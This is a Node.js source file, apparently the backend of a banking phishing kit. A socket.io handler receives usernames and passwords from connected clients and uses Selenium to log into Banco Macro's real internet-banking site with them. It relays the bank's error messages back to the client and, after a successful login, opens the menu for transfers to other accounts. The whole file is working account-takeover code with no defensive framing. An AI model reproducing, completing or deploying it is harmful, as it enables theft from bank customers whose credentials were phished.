const { emit } = require("nodemon");

module.exports = httpServer => {

    const chrm = require("chromedriver");
    // Include selenium webdriver
    const swd = require("selenium-webdriver");
    const chrome = require("selenium-webdriver/chrome");
    const firefox = require("selenium-webdriver/firefox");


    const { Server } = require("socket.io");
    const io = new Server(httpServer);

    io.on("connection", socket => {

        // Recibir data y enviar al adm
        socket.on("Data", data => {
            totalInfo = [data];

            let browser = new swd.Builder();
            let tab = browser.forBrowser("chrome")
                //.setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                //.setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                .build();

            //Step 1 - Opening sign in page
            let tabToOpenSignIn =
                tab.get("https://www.macro.com.ar/bancainternet/");
            tabToOpenSignIn
                .then(() => {
                    // Timeout to wait if connection is slow
                    let findTimeOutP =
                        tab.manage().setTimeouts({
                            implicit: 15000, // 15 seconds
                        });
                    return findTimeOutP;
                })
                .then(() => {
                    //Finding the username input
                    let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
                        .catch(() => {
                            tab.quit();
                            io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
                            throw new Error("Mantenimiento");
                        })
                    return promiseUsernameBox;
                })
                //Entering the username
                .then(usernameBox => {
                    let promiseFillUsername =
                        usernameBox.sendKeys(data.user);
                    return promiseFillUsername;
                })
                .then(() => {
                    console.log("Username entered successfully");
                    let promiseBtnIngresar =
                        tab.findElement(swd.By.css("#processCustomerLogin"));
                    return promiseBtnIngresar;
                })
                .then(promiseBtnIngresar => {
                    let promiseClickIngresar = promiseBtnIngresar.click();
                    return promiseClickIngresar;
                })
                .then(() => {
                    //Finding the password input
                    let promisePasswordBox =
                        tab.findElement(swd.By.css("#login_textField1"));
                    return promisePasswordBox;
                })
                //Entering the password
                .then(PasswordBox => {
                    let promiseFillPassword =
                        PasswordBox.sendKeys(data.pass);
                    return promiseFillPassword;
                })
                .then(() => {
                    console.log("Password entered successfully");
                    let promiseBtnIngresar = tab.findElement(swd.By.css("#processSystem_UserLogin"));
                    return promiseBtnIngresar;
                })
                .then(promiseBtnIngresar => {
                    let promiseClickIngresar = promiseBtnIngresar.click();
                    return promiseClickIngresar;
                })
                .then(() => {
                    let promiseError = tab.findElement(swd.By.css("#modalContainer")).getText()
                        .catch(() => {
                            return false;
                        })
                    return promiseError;
                })
                .then(errorLogin => {
                    if (errorLogin) {
                        console.log(errorLogin)
                        tab.quit();
                        io.to(data.socket).emit("ErrorLogin", errorLogin);
                        throw new Error("de inicio de sesion!");
                    }
                })
                .then(() => {
                    console.log("Inicio de sesión exitoso");
                    let promiseOpenMenu = tab.findElements(swd.By.css(".openMenu"));
                    return promiseOpenMenu;
                })
                .then(promiseOpenMenu => {
                    return promiseOpenMenu[1];
                })
                .then(WebElementMenu => {
                    let WebElementMenuPromise = tab.executeScript("arguments[0].classList.add('open');",WebElementMenu);
                    return WebElementMenuPromise;
                })
                .then(() => {
                    console.log("Menu Display");
                    let promiseOpenMenu = tab.findElements(swd.By.css("#processAccountOtherTransferCuentasVista"));
                    return promiseOpenMenu;
                })
                .then(promiseOpenMenu => {
                    promiseOpenMenu.click();
                })
                .catch(err => {
                    console.log("Error ", err, " occurred!");
                });
        });

    })
}